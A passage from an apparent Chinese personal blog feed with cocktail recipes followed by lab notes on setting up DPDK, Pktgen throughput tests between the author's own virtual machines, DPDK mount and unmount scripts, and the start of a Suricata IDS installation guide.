</p><p>Shake，冰冻Martini杯</p><p>挤柠檬皮油并装饰</p><p><em>tips：喜欢清爽感可以再加气泡水</em></p><blockquote><p>关于糖浆</p><p>单糖浆：水煮沸（冷水也可以）加入等量白砂糖，完全溶解冷藏</p><p>蜂蜜糖浆：将半杯水和半杯蜂蜜加入锅中，一边中火慢煮，一边搅拌至混合，等水煮干后滤入瓶中，用盖子密封，可在冰箱中保存1个月（用的蜂蜜越多，糖浆就越稠，味道就越浓）</p><p>别的各种品类糖浆可以直接购买成品</p></blockquote><h3 id="Bourbon-Highball"><a href="#Bourbon-Highball" class="headerlink" title="Bourbon Highball"></a><code>Bourbon Highball</code></h3><p><strong>40ml Bourbon Whisky + 120ml 苏打水</strong></p><p>满冰Highball杯</p><p>可加适量柠檬与薄荷等</p><h3 id="Bourbon-Ginger-Highball"><a href="#Bourbon-Ginger-Highball" class="headerlink" title="Bourbon Ginger Highball"></a><code>Bourbon Ginger Highball</code></h3><p><strong>40ml Bourbon Whisky + 5-10ml 柠檬汁 + 100ml 姜汁汽水</strong></p><p>满冰Highball杯</p><h3 id="Bourbon-Cola-Highball"><a href="#Bourbon-Cola-Highball" class="headerlink" title="Bourbon Cola Highball"></a><code>Bourbon Cola Highball</code></h3><p><strong>40ml Bourbon Whisky + 5-10ml 柠檬汁 + 随意可乐</strong></p><p>满冰Highball杯</p><h3 id="Mizuwari（水割）"><a href="#Mizuwari（水割）" class="headerlink" title="Mizuwari（水割）"></a><code>Mizuwari</code>（水割）</h3><p><strong>50ml 三得利角牌 + 150ml 水</strong></p><p>满冰冻酒杯，Stir至起霜</p><h2 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h2><h3 id="Gin-Tonic（金汤力）"><a href="#Gin-Tonic（金汤力）" class="headerlink" title="Gin Tonic（金汤力）"></a><code>Gin Tonic</code>（金汤力）</h3><p><strong>40ml Gin + 120ml 汤力水</strong></p><p>满冰Highball杯，吧勺上下提拉（最好不Stir）</p><p>喷挤柠檬皮油，一瓣青柠装饰</p><h3 id="Gimlet（螺丝钻）"><a href="#Gimlet（螺丝钻）" class="headerlink" title="Gimlet（螺丝钻）"></a><code>Gimlet</code>（螺丝钻）</h3><p><strong>60ml Gin + 15ml 柠檬汁 + 15ml 糖浆</strong></p><p>Shake，冰冻Martini杯</p><p>一瓣青柠装饰</p><h3 id="Negroni（尼格罗尼）"><a href="#Negroni（尼格罗尼）" class="headerlink" title="Negroni（尼格罗尼）"></a><code>Negroni</code>（尼格罗尼）</h3><p><strong>30ml Gin + 30ml CAMPARI + 30ml 甜味美思</strong></p><p>加冰Stir，加冰Old Fashion杯子</p><p>一片橙子皮装饰</p><h3 id="Tom-Collins（汤姆柯林斯）"><a href="#Tom-Collins（汤姆柯林斯）" class="headerlink" title="Tom Collins（汤姆柯林斯）"></a><code>Tom Collins</code>（汤姆柯林斯）</h3><p><strong>60ml Gin + 30ml 柠檬汁 + 15ml 糖浆 + 加满苏打水</strong></p><p>满冰Highball杯</p><p>一片柠檬皮装饰</p><blockquote><p>有水果汁的酒通常需要Shake</p></blockquote><h3 id="French-75（法兰西75）"><a href="#French-75（法兰西75）" class="headerlink" title="French 75（法兰西75）"></a><code>French 75</code>（法兰西75）</h3><p><strong>45ml Gin + 22.5ml 柠檬汁 + 22.5ml 糖浆 + 加满香槟</strong></p><p>Shake，香槟杯</p><p>长条柠檬皮装饰</p><h2 id="Vodka"><a href="#Vodka" class="headerlink" title="Vodka"></a>Vodka</h2><h3 id="Vodka-Lemon"><a href="#Vodka-Lemon" class="headerlink" title="Vodka Lemon"></a><code>Vodka Lemon</code></h3><p><strong>40ml Vodka + 挤半个柠檬切角</strong></p><p>大块冰块Old Fashion杯</p><p>喷挤柠檬皮油</p><h3 id="Vodka-Soda"><a href="#Vodka-Soda" class="headerlink" title="Vodka Soda"></a><code>Vodka Soda</code></h3><p><strong>40ml Vodka + 挤半个柠檬切角 + 加满苏打水</strong></p><p>满冰Highball杯</p><h3 id="Vodka-Lemon-Drop"><a href="#Vodka-Lemon-Drop" class="headerlink" title="Vodka Lemon Drop"></a><code>Vodka Lemon Drop</code></h3><p><strong>50ml Vodka  + 15ml 糖浆 +  15ml 柠檬汁</strong></p><p>Shake，倒入shot杯</p><p>搭配粘上糖粉的柠檬角（喝完酒吃）</p><h3 id="Screw-Driver（螺丝起子）"><a href="#Screw-Driver（螺丝起子）" class="headerlink" title="Screw Driver（螺丝起子）"></a><code>Screw Driver</code>（螺丝起子）</h3><p><strong>45ml Vodka  + 90ml 橙汁</strong></p><p>满冰Highball杯</p><p>一片橙子装饰</p><h3 id="Madras（马德拉斯）"><a href="#Madras（马德拉斯）" class="headerlink" title="Madras（马德拉斯）"></a><code>Madras</code>（马德拉斯）</h3><p><strong>45ml Vodka  + 90ml 蔓越莓汁 +  30ml 橙汁</strong></p><p>满冰Highball杯</p><p>一瓣青柠装饰</p><h3 id="Bay-Breeze（海湾清风）"><a href="#Bay-Breeze（海湾清风）" class="headerlink" title="Bay Breeze（海湾清风）"></a><code>Bay Breeze</code>（海湾清风）</h3><p><strong>45ml Vodka  + 60ml 蔓越莓汁 +  60ml 菠萝汁</strong></p><p>满冰Highball杯</p><p>一瓣青柠装饰</p><h3 id="Moscow-Mule（莫斯科骡子）"><a href="#Moscow-Mule（莫斯科骡子）" class="headerlink" title="Moscow Mule（莫斯科骡子）"></a><code>Moscow Mule</code>（莫斯科骡子）</h3><p><strong>60ml Vodka  + 15ml 青柠汁 +  90ml 姜汁啤酒</strong></p><p>满冰铜杯（铜杯导热快）</p><p>一片青柠装饰</p><blockquote><p><strong>Ginger Beer 与 Ginger Ale不同</strong></p><ul><li><p>Ginger Beer 同样不含酒精，姜味更重，更辛辣</p></li><li><p>Ginger Ale 气泡感觉更足，更轻</p></li></ul></blockquote><h3 id="Cosmopolitan（大都会）"><a href="#Cosmopolitan（大都会）" class="headerlink" title="Cosmopolitan（大都会）"></a><code>Cosmopolitan</code>（大都会）</h3><p><strong>45ml 柠檬味Vodka  + 15ml 青柠汁 + 15ml 君度橙酒 + 30ml 蔓越莓汁</strong></p><p>Shake，冰冻Martini杯</p><p>一瓣青柠装饰</p><h2 id="Rum"><a href="#Rum" class="headerlink" title="Rum"></a>Rum</h2><h3 id="Mojito（莫吉托）"><a href="#Mojito（莫吉托）" class="headerlink" title="Mojito（莫吉托）"></a><code>Mojito</code>（莫吉托）</h3><p><strong>1shot RUM + 2匙 糖 + 青柠薄荷 + 气泡水</strong>，冰块与碎冰大半杯</p><h3 id="Cuba-Libre（自由古巴）"><a href="#Cuba-Libre（自由古巴）" class="headerlink" title="Cuba Libre（自由古巴）"></a><code>Cuba Libre</code>（自由古巴）</h3><p><strong>40ml RUM +  补满可乐</strong>，7分满冰杯，搭配柠檬角、香草/薄荷</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="百利甜奶茶"><a href="#百利甜奶茶" class="headerlink" title="百利甜奶茶"></a><code>百利甜奶茶</code></h3><p><strong>1shot 百利甜 + 120ml 奶茶</strong>，满冰Highball杯，打发奶泡倒在最上面</p><h3 id="Campari-Cola"><a href="#Campari-Cola" class="headerlink" title="Campari Cola"></a><code>Campari Cola</code></h3><p><strong>30-60ml Campari + 随意柠檬汁 + 随意可乐</strong></p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>微醺日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>List</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pktgen配置使用</title>
    <link href="/posts/9e06ee82/"/>
    <url>/posts/9e06ee82/</url>
    
    <content type="html"><![CDATA[<blockquote><p>配置信息：</p><p>VMware® Workstation 16 Pro: 16.1.1 build-17801498</p><p>Ubuntu-16.04.6: Linux ubuntu 4.15.0-142-generic</p><p>CPU: 2个处理器，每个处理器2个内核</p><p>内存: 4GB</p><p>网卡: 网络适配器-NAT(ens33)，网络适配器2-Host-only(ens38)，网络适配器3-Host-only(ens39)</p><p><a href="http://core.dpdk.org/download/">DPDK</a>: DPDK-17.11.10(LTS)</p><p><a href="https://git.dpdk.org/apps/pktgen-dpdk/refs/tags">Pktgen</a>: pktgen-3.4.5</p><p>PS：安装使用Pktgen前，需要将DPDK安装配置完成，可参考<a href="https://leex0.top/posts/7214eebe/">链接</a>。</p></blockquote><h2 id="1-下载解压编译"><a href="#1-下载解压编译" class="headerlink" title="1. 下载解压编译"></a>1. 下载解压编译</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget https:&#x2F;&#x2F;git.dpdk.org&#x2F;apps&#x2F;pktgen-dpdk&#x2F;snapshot&#x2F;pktgen-dpdk-pktgen-3.4.5.tar.gztar -xvJf pktgen-dpdk-pktgen-3.4.5.tar.gzcd pktgen-dpdk-pktgen-3.4.5make</code></pre></div><h2 id="2-网卡互打测试"><a href="#2-网卡互打测试" class="headerlink" title="2. 网卡互打测试"></a>2. 网卡互打测试</h2><p>测试在同一虚拟机中一网卡发送另一网卡接收</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># TEST pktgen# 必须在Pktgen的根目录下运行# -l：使用核心列表 -n：指定内存通道 -- -P：开启网卡混杂模式 -m：端口映射# &quot;[1].0, [2].1&quot;：核心1映射到port0，核心2映射到port1.&#x2F;app&#x2F;build&#x2F;pktgen -l 0-2 -n 3 -- -P -m &quot;[1].0, [2].1&quot;</code></pre></div><p>限制接受网卡速率后的<code>Pktgen</code>发送速率如下（千兆网卡）</p><p><img src="/posts/9e06ee82/2.png"></p><h2 id="3-双虚拟机：Pktgen发送到testpmd"><a href="#3-双虚拟机：Pktgen发送到testpmd" class="headerlink" title="3. 双虚拟机：Pktgen发送到testpmd"></a>3. 双虚拟机：<code>Pktgen</code>发送到<code>testpmd</code></h2><p><code>Ptkgen</code>端网卡mac为<strong>00:0c:29:3e:a9:4f</strong>，<code>testpmd</code>端网卡mac为<strong>00:0c:29:77:d3:89</strong></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># RUN pktgen# pktgen:&#x2F;&gt; set 0 dst ip 192.168.74.132# IP设定没有用,通过mac发送.&#x2F;app&#x2F;x86_64-native-linuxapp-gcc&#x2F;pktgen -l 0-1 -n 3 -- -P -m &quot;[1].0&quot;pktgen:&#x2F;&gt; set 0 dst mac 00:0c:29:77:d3:89# RUN testpmd# -l：使用核心列表 -n：指定内存通道 -- -i:交互模式.&#x2F;testpmd -l 0-1 -n 1 -- -i# 设置只读testpmd&gt; set fwd rxonly# 设置非混杂模式(这两项设定这样就只收pktgen发来的包)testpmd&gt; set promisc all off# 运行开始testpmd&gt; start# 查看接收状态testpmd&gt; show port stats all</code></pre></div><h3 id="3-1-Pktgen设定1000个包发送"><a href="#3-1-Pktgen设定1000个包发送" class="headerlink" title="3.1 Pktgen设定1000个包发送"></a>3.1 <code>Pktgen</code>设定1000个包发送</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pktgen:&#x2F;&gt; set 0 count 1000pktgen:&#x2F;&gt; start 0</code></pre></div><p><code>Pktgen</code>端发送状况</p><p><img src="/posts/9e06ee82/31-1.png"></p><p><code>testpmd</code>端接收状况，，可以看到<code>port 0</code>比<code>port 1</code>多接收了<strong>1000</strong>个包(测试了100个包基础上)。</p><p><img src="/posts/9e06ee82/31-2.png"></p><h3 id="3-2-Pktgen设定10000个包发送"><a href="#3-2-Pktgen设定10000个包发送" class="headerlink" title="3.2 Pktgen设定10000个包发送"></a>3.2 <code>Pktgen</code>设定10000个包发送</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pktgen:&#x2F;&gt; set 0 count 10000pktgen:&#x2F;&gt; start 0</code></pre></div><p><code>testpmd</code>端接收状况，可以看到<code>port 0</code>比<code>port 1</code>多接收了<strong>10000</strong>个包(上一轮测试基础上)。</p><p><img src="/posts/9e06ee82/32-1.png"></p><h3 id="3-3-不限制包数目发送"><a href="#3-3-不限制包数目发送" class="headerlink" title="3.3 不限制包数目发送"></a>3.3 不限制包数目发送</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pktgen:&#x2F;&gt; start 0</code></pre></div><p> <code>Pktgen</code>端发送状况</p><p><img src="/posts/9e06ee82/33-1.png"></p><p><code>testpmd</code>端接收状况</p><p><img src="/posts/9e06ee82/33-2.png"></p><p><img src="/posts/9e06ee82/33-3.png"></p><hr><h3 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h3><ol start="0"><li><p><strong>情形一</strong>：两个虚拟机的两个虚拟网卡一个发送一个接收；<strong>情形二</strong>：一个虚拟机中两个虚拟网卡一个发送一个接收</p></li><li><p>千兆网卡的速率上限由何决定？为什么情形一和情形二，既不是两个满带宽，也不是两个对半分带宽。</p></li><li><p>情形一和情形二为何带宽速率一样？</p></li></ol><hr><blockquote><p>参考：</p><p><a href="https://www.jianshu.com/p/fa7d9f2c0f55">https://www.jianshu.com/p/fa7d9f2c0f55</a></p><p><a href="https://pktgen-dpdk.readthedocs.io/en/latest/getting_started.html">https://pktgen-dpdk.readthedocs.io/en/latest/getting_started.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/154066913">https://zhuanlan.zhihu.com/p/154066913</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>Pktgen</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DPDK</tag>
      
      <tag>Pktgen</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DPDK17挂载与卸载脚本</title>
    <link href="/posts/655e2191/"/>
    <url>/posts/655e2191/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="http://core.dpdk.org/download/">DPDK</a>: DPDK-17.11.10(LTS)</p><p>每次相关设置改变需要对DPDK重启时，都要进行许多配置操作较为麻烦。</p><p>参考<code>DPDK/usertools/dpdk-setup.sh</code>写成DPDK的挂载与卸载脚本方便使用。</p><p>其中<code>RTE_SDK</code>、<code>RTE_TARGET</code>、网卡地址等参数根据自己实际情况填入，不再写交互式脚本（否则与<code>dpdk-setup.sh</code>无异）。</p></blockquote><p><code>dpdk-mount.rc</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">#!&#x2F;bin&#x2F;shexport RTE_SDK&#x3D;&#x2F;opt&#x2F;dpdk-stable-17.11.10export RTE_TARGET&#x3D;x86_64-native-linuxapp-gcc&#x2F;sbin&#x2F;modprobe uio&#x2F;sbin&#x2F;insmod $RTE_SDK&#x2F;$RTE_TARGET&#x2F;kmod&#x2F;igb_uio.komkdir -p &#x2F;mnt&#x2F;hugemount -t hugetlbfs nodev &#x2F;mnt&#x2F;hugeecho 512 &gt; &#x2F;sys&#x2F;devices&#x2F;system&#x2F;node&#x2F;node0&#x2F;hugepages&#x2F;hugepages-2048kB&#x2F;nr_hugepagesifconfig ens38 downifconfig ens39 down$&#123;RTE_SDK&#125;&#x2F;usertools&#x2F;dpdk-devbind.py -b igb_uio 02:06.0$&#123;RTE_SDK&#125;&#x2F;usertools&#x2F;dpdk-devbind.py -b igb_uio 02:07.0grep -i huge &#x2F;proc&#x2F;meminfo$&#123;RTE_SDK&#125;&#x2F;usertools&#x2F;dpdk-devbind.py --status</code></pre></div><p><code>dpdk-rm.rc</code></p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">#!&#x2F;bin&#x2F;sh$&#123;RTE_SDK&#125;&#x2F;usertools&#x2F;dpdk-devbind.py -b e1000 02:06.0$&#123;RTE_SDK&#125;&#x2F;usertools&#x2F;dpdk-devbind.py -b e1000 02:07.0echo 0 &gt; &#x2F;sys&#x2F;devices&#x2F;system&#x2F;node&#x2F;node0&#x2F;hugepages&#x2F;hugepages-2048kB&#x2F;nr_hugepagesumount &#x2F;mnt&#x2F;hugerm -R &#x2F;mnt&#x2F;huge&#x2F;sbin&#x2F;rmmod igb_uiogrep -i huge &#x2F;proc&#x2F;meminfo  $&#123;RTE_SDK&#125;&#x2F;usertools&#x2F;dpdk-devbind.py --statusunset RTE_SDKunset RTE_TARGET</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>DPDK</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DPDK</tag>
      
      <tag>数据转发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DPDK配置测试</title>
    <link href="/posts/7214eebe/"/>
    <url>/posts/7214eebe/</url>
    
    <content type="html"><![CDATA[<blockquote><p>配置信息：</p><p>VMware® Workstation 16 Pro: 16.1.1 build-17801498</p><p>Ubuntu-16.04.6: Linux ubuntu 4.15.0-142-generic</p><p>CPU: 2个处理器，每个处理器2个内核</p><p>内存: 4GB</p><p>网卡: 网络适配器-NAT(ens33)，网络适配器2-Host-only(ens38)，网络适配器3-Host-only(ens39)</p><p><a href="http://core.dpdk.org/download/">DPDK</a>: DPDK-17.11.10(LTS)</p></blockquote><h3 id="1-DPDK下载"><a href="#1-DPDK下载" class="headerlink" title="1. DPDK下载"></a>1. DPDK下载</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wget http:&#x2F;&#x2F;fast.dpdk.org&#x2F;rel&#x2F;dpdk-17.11.10.tar.xztar -xvf dpdk-17.11.10.tar.xz</code></pre></div><h3 id="2-编译前修改"><a href="#2-编译前修改" class="headerlink" title="2. 编译前修改"></a>2. 编译前修改</h3><blockquote><p>DPDK在虚拟机中实验，本例使用vmware添加的虚拟网卡，会有兼容性问题。</p><p><code>EAL:Error reading from file descriptor xx: Input/output error</code></p><p>修改<code>/dpdk-stable-17.11.10/lib/librte_eal/linuxapp/igb_uio/igb_uio.c</code>以下内容，跳过检测。</p></blockquote><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">&#x2F;* fall back to INTX *&#x2F;case RTE_INTR_MODE_LEGACY:if (pci_intx_mask_supported(dev）) &#123;dev_dbg(&amp;dev-&gt;dev, &quot;using INTX&quot;);udev-&gt;info.irq_flags &#x3D; IRQF_SHARED | IRQF_NO_THREAD;udev-&gt;info.irq &#x3D; dev-&gt;irq;udev-&gt;mode &#x3D; RTE_INTR_MODE_LEGACY;break;&#125;dev_notice(&amp;dev-&gt;dev, &quot;PCI INTX mask not supported               &#x2F;&#x2F; 修改为：if判断中增加true使其为真               &#x2F;* fall back to INTX *&#x2F;case RTE_INTR_MODE_LEGACY:if (pci_intx_mask_supported(dev)||true) &#123;dev_dbg(&amp;dev-&gt;dev, &quot;using INTX&quot;);udev-&gt;info.irq_flags &#x3D; IRQF_SHARED | IRQF_NO_THREAD;udev-&gt;info.irq &#x3D; dev-&gt;irq;udev-&gt;mode &#x3D; RTE_INTR_MODE_LEGACY;break;&#125;dev_notice(&amp;dev-&gt;dev, &quot;PCI INTX mask not supported\</code></pre></div><h3 id="3-配置环境变量-编译-配置其他选项"><a href="#3-配置环境变量-编译-配置其他选项" class="headerlink" title="3. 配置环境变量-编译-配置其他选项"></a>3. 配置环境变量-编译-配置其他选项</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">export RTE_SDK&#x3D;&lt;dpdk主目录&gt; # export RTE_SDK&#x3D;&#x2F;opt&#x2F;dpdk-stable-17.11.10export RTE_TARGET&#x3D;x86_64-native-linuxapp-gcc</code></pre></div><p>较早版本的DPDK都提供了一个安装脚本<code>/dpdk-stable-17.11.10/usertools/dpdk-setup.sh</code>，方便完成编译、设置、测试等内容。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.&#x2F;dpdk-setup.sh# 选择[14]编译DPDK[14] x86_64-native-linuxapp-gcc# 设置大页内存，本次设定的512[21] Setup hugepage mappings for NUMA systems# 查看大页内存[28] List hugepage info from &#x2F;proc&#x2F;meminfo# 载入IGB UIO模块[17] Insert IGB UIO module# 查看当前网卡绑定情况[22] Display current Ethernet&#x2F;Crypto device settings# 若需要绑定到DPDK的网卡处于*Active*状态，需要先down掉# 退出脚本，down网卡[34] Exit Script</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 查看网卡信息，需要down那些网卡ifconfig# 本例down另外配置的ens38与ens39网卡ifconfig ens38 downifconfig ens39 down</code></pre></div><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 重新进入脚本绑定网卡到DPDK.&#x2F;dpdk-setup.sh[22] Display current Ethernet&#x2F;Crypto device settings# 输入网卡前的描述符进行绑定，本例ens38对应02:06.0，ens39对应02:07.002:06.002:07.0# 查看当前网卡绑定情况[22] Display current Ethernet&#x2F;Crypto device settings# 此时应该能看到刚才设定的两张网卡已设定到DPDK-compatible driver</code></pre></div><h3 id="4-简单测试"><a href="#4-简单测试" class="headerlink" title="4. 简单测试"></a>4. 简单测试</h3><p>完成以上配置之后DPDK配置基本已经完成，可以仍在安装脚本中直接进行测试。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">[27] Run testpmd application in interactive mode ($RTE_TARGET&#x2F;app&#x2F;testpmd)bitmask:fLaunching appEAL: Detected 4 lcore(s)EAL: No free hugepages reported in hugepages-1048576kBEAL: Probing VFIO support...EAL: PCI device 0000:02:01.0 on NUMA socket -1EAL:   Invalid NUMA socket, default to 0EAL:   probe driver: 8086:100f net_e1000_emEAL: PCI device 0000:02:06.0 on NUMA socket -1EAL:   Invalid NUMA socket, default to 0EAL:   probe driver: 8086:100f net_e1000_emEAL: PCI device 0000:02:07.0 on NUMA socket -1EAL:   Invalid NUMA socket, default to 0EAL:   probe driver: 8086:100f net_e1000_emInteractive-mode selectedUSER1: create a new mbuf pool &lt;mbuf_pool_socket_0&gt;: n&#x3D;171456, size&#x3D;2176, socket&#x3D;0Configuring Port 0 (socket 0)Port 0: 00:0C:29:3E:A9:4FConfiguring Port 1 (socket 0)Port 1: 00:0C:29:3E:A9:59Checking link statuses...Donetestpmd&gt; startio packet forwarding - ports&#x3D;2 - cores&#x3D;1 - streams&#x3D;2 - NUMA support enabled, MP over anonymous pages disabledLogical Core 1 (socket 0) forwards packets on 2 streams:  RX P&#x3D;0&#x2F;Q&#x3D;0 (socket 0) -&gt; TX P&#x3D;1&#x2F;Q&#x3D;0 (socket 0) peer&#x3D;02:00:00:00:00:01  RX P&#x3D;1&#x2F;Q&#x3D;0 (socket 0) -&gt; TX P&#x3D;0&#x2F;Q&#x3D;0 (socket 0) peer&#x3D;02:00:00:00:00:00  io packet forwarding packets&#x2F;burst&#x3D;32  nb forwarding cores&#x3D;1 - nb forwarding ports&#x3D;2  port 0:  CRC stripping enabled  RX queues&#x3D;1 - RX desc&#x3D;128 - RX free threshold&#x3D;0  RX threshold registers: pthresh&#x3D;0 hthresh&#x3D;0  wthresh&#x3D;0  TX queues&#x3D;1 - TX desc&#x3D;512 - TX free threshold&#x3D;0  TX threshold registers: pthresh&#x3D;0 hthresh&#x3D;0  wthresh&#x3D;0  TX RS bit threshold&#x3D;0 - TXQ flags&#x3D;0x0  port 1:  CRC stripping enabled  RX queues&#x3D;1 - RX desc&#x3D;128 - RX free threshold&#x3D;0  RX threshold registers: pthresh&#x3D;0 hthresh&#x3D;0  wthresh&#x3D;0  TX queues&#x3D;1 - TX desc&#x3D;512 - TX free threshold&#x3D;0  TX threshold registers: pthresh&#x3D;0 hthresh&#x3D;0  wthresh&#x3D;0  TX RS bit threshold&#x3D;0 - TXQ flags&#x3D;0x0testpmd&gt; stopTelling cores to stop...Waiting for lcores to finish...  ---------------------- Forward statistics for port 0  ----------------------  RX-packets: 7194           RX-dropped: 0             RX-total: 7194  TX-packets: 6886           TX-dropped: 0             TX-total: 6886  ----------------------------------------------------------------------------  ---------------------- Forward statistics for port 1  ----------------------  RX-packets: 6886           RX-dropped: 0             RX-total: 6886  TX-packets: 7194           TX-dropped: 0             TX-total: 7194  ----------------------------------------------------------------------------  +++++++++++++++ Accumulated forward statistics for all ports+++++++++++++++  RX-packets: 14080          RX-dropped: 0             RX-total: 14080  TX-packets: 14080          TX-dropped: 0             TX-total: 14080  ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++Done.testpmd&gt; quitStopping port 0...Stopping ports...DoneStopping port 1...Stopping ports...DoneShutting down port 0...Closing ports...DoneShutting down port 1...Closing ports...DoneBye...</code></pre></div><h3 id="其他版本相关"><a href="#其他版本相关" class="headerlink" title="其他版本相关"></a>其他版本相关</h3><blockquote><p>和上述内容相似，在虚拟机中使用igb_uio驱动时仍可能遇到网卡不兼容问题，在你的驱动编译前修改并调过验证。</p></blockquote><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">### 依赖检查gcc -v# gcc (version 4.9+) pkg-config --version# pkg-config 0.27+uname -r# Kernel version &gt;&#x3D; 4.4ldd --version# glibc &gt;&#x3D; 2.7grep -i huge &#x2F;boot&#x2F;config-4.15.0-142-generic# OutputCONFIG_HUGETLBFS&#x3D;yCONFIG_HUGETLB_PAGE&#x3D;ypip3 install meson ninja### dpdk下载wget http:&#x2F;&#x2F;fast.dpdk.org&#x2F;rel&#x2F;dpdk-20.11.1.tar.xztar xJf dpdk-20.11.1.tar.xzcd dpdk-stable-20.11.1# dpdk编译安装meson -Dexamples&#x3D;all buildcd buildninja install### 配置大页内存mkdir &#x2F;mnt&#x2F;hugeecho 512 &gt; &#x2F;sys&#x2F;devices&#x2F;system&#x2F;node&#x2F;node0&#x2F;hugepages&#x2F;hugepages-2048kB&#x2F;nr_hugepagesmount -t hugetlbfs nodev &#x2F;mnt&#x2F;hugegrep -i huge &#x2F;proc&#x2F;meminfo# 透明大页配置echo always &gt;&#x2F;sys&#x2F;kernel&#x2F;mm&#x2F;transparent_hugepage&#x2F;enabledecho madvise &gt;&#x2F;sys&#x2F;kernel&#x2F;mm&#x2F;transparent_hugepage&#x2F;enabledecho never &gt;&#x2F;sys&#x2F;kernel&#x2F;mm&#x2F;transparent_hugepage&#x2F;enabled### 自动挂载vim &#x2F;etc&#x2F;fstab#添加以下内容nodev &#x2F;mnt&#x2F;huge hugetlbfs pagesize&#x3D;2MB 0 0#如果是1GB 则nodev &#x2F;mnt&#x2F;huge hugetlbfs pagesize&#x3D;1GB 0 0### 编译产生问题可能由于缺少以下组件sudo apt-get install numactlsudo apt-get install libnuma-dev</code></pre></div><hr><blockquote><p>参考：</p><p><a href="http://doc.dpdk.org/guides-20.11/">http://doc.dpdk.org/guides-20.11/</a></p><p><a href="https://blog.csdn.net/qwe13182912113/article/details/79260331?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&amp;dist_request_id=1332048.21311.16195122750681543&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">https://blog.csdn.net/qwe13182912113/article/details/79260331?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&amp;dist_request_id=1332048.21311.16195122750681543&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control</a></p><p><a href="https://zhuanlan.zhihu.com/p/368045406">https://zhuanlan.zhihu.com/p/368045406</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>DPDK</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DPDK</tag>
      
      <tag>数据转发</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Suricata安装测试</title>
    <link href="/posts/1c458c9b/"/>
    <url>/posts/1c458c9b/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://suricata-ids.org/">Suricata</a>是一个免费和开源，成熟，快速且强大的网络威胁检测引擎。</p><p>Suricata引擎能够进行实时入侵检测（IDS），内联入侵防御（IPS），网络安全监控（NSM）和离线pcap处理。Suricata使用强大而广泛的规则和签名语言检查网络流量，并具有强大的Lua脚本支持来检测复杂的威胁。通过YAML和JSON之类的标准输入和输出格式，与现有SIEM，Splunk，Logstash / Elasticsearch，Kibana和其他数据库之类的工具的集成变得毫不费力。</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># Recommended dependencyapt-get install libpcre3 libpcre3-dbg libpcre3-dev build-essential libpcap-dev   \                libnet1-dev libyaml-0-2 libyaml-dev pkg-config zlib1g zlib1g-dev \                libcap-ng-dev libcap-ng0 make libmagic-dev         \                libgeoip-dev liblua5.1-dev libhiredis-dev libevent-dev \                python-yaml rustc cargo#  Binary packages - Ubuntusudo add-apt-repository ppa:oisf&#x2F;suricata-stablesudo apt-get update# &#96;jq&#96; help with displaying information from Suricata’s EVE JSON outputsudo apt-get install suricata jq# Verify Installationsudo suricata --build-infosudo systemctl status suricata# Outputs：● suricata.service - LSB: Next Generation IDS&#x2F;IPS   Loaded: loaded (&#x2F;etc&#x2F;init.d&#x2F;suricata; bad; vendor preset: enabled)   Active: active (exited) since 二 2021-05-25 15:29:42 CST; 2min 27s ago     Docs: man:systemd-sysv-generator(8)5月 25 15:29:42 ubuntu systemd[1]: Starting LSB: Next Generation IDS&#x2F;IPS...5月 25 15:29:42 ubuntu suricata[39360]: Starting suricata in IDS (af-packet) mode... done.5月 25 15:29:42 ubuntu systemd[1]: Starte™£d LSB: Next Generation IDS&#x2F;IPS.# update rules: merge the lastet rules to &#x2F;etc&#x2F;suricata&#x2F;rules&#x2F;*suricate-update</code></pre></div><h2 id="网卡配置"><a href="#网卡配置" class="headerlink" 